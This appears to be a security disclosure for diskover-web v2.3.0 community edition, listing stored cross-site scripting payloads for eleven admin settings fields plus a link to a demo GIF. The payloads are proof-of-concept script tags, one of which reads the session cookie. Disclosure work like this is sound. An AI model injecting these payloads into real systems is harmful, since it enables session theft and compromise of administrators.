```diskover-web v2.3.0 community edition (ce)```


Stored XSS
There are multiple stored xss in the admin settings.


ES_HOST

```test<script>alert(document.cookie)</script>test```


ES_INDEXREFRESH

```test"><script>alert(1)</script>test```


ES_PORT

```9200<script>alert(document.domain)</script>test```


ES_SCROLLSIZE

```test"><script>alert(1)</script>test```


ES_TRANSLOGSIZE

```test"><script>alert(1)</script>test```


ES_TRANSLOGSYNCINT

```test"><script>alert(1)</script>test```


EXCLUDES_FILES

```test"><script>alert(1)</script>test```


FILE_TYPES[]

```test<script>alert(1)</script> test```


INCLUDES_DIRS

```test"><script>alert(1)</script>test```


INCLUDES_FILES

```test"><script>alert(1)</script>test```


TIMEZONE

```test"><script>alert(1)</script>test```


Demo:
![](https://github.com/4rdr/proofs/blob/main/gifs/diskover-web_v2.3.0_community_edition_stored_XSS_via_settings.gif?raw=true)


